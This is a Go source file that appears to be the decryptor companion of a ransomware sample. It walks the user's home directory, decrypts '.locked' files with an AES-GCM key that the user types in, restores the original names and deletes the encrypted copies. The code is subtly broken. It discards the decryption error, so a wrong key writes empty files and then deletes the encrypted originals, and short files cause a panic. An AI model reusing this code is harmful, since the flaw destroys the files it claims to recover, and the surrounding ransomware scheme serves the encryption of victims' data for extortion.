package main

import (
	"crypto/aes"
	"crypto/cipher"
	"fmt"
	"os"
	"path/filepath"
)

func main() {
	var key string
	fmt.Print("Insert Key: ")
	fmt.Scanln(&key)

	// Check key input
	block, errBlock := aes.NewCipher([]byte(key)) // check key
	if errBlock != nil {
		fmt.Println("Character error? Try again...") // print out error then end program
		return
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		fmt.Println("error in gcm:", err)
		return
	}

	// Set path to the user's home directory
	dir, err := os.UserHomeDir()
	if err != nil {
		fmt.Println("error getting home directory:", err)
		return
	}

	// Loop through files for decryption
	err = filepath.Walk(dir, func(path string, info os.FileInfo, errPath error) error {
		if errPath != nil {
			fmt.Println("error in pathing:", errPath)
			return errPath
		}

		// Decrypt files only, not folders
		if info != nil && !info.IsDir() && filepath.Ext(path) == ".locked" {
			fmt.Println("Decrypting " + path + "...") // for checking

			// Start decrypting the file
			encrypted, errFile := os.ReadFile(path)
			if errFile == nil { // this means no error
				// Decrypt bytes
				nonce := encrypted[:gcm.NonceSize()] // extract nonce from encrypted bytes
				encrypted = encrypted[gcm.NonceSize():]
				original, errWrite := gcm.Open(nil, nonce, encrypted, nil)

				// Write the decrypted contents
				errWrite = os.WriteFile(path[:len(path)-7], original, 0666) // remove .locked extension
				if errWrite == nil {                                        // no error
					os.Remove(path) // delete the encrypted file for clean up
				} else {
					fmt.Println("error decrypting content:", errWrite) // for checking
				}

			} else {
				fmt.Println("error reading this file:", errFile)
			}
		}

		return nil // return nothing since return is needed
	})

	if err != nil {
		fmt.Println("error walking the path:", err)
		return
	}
}
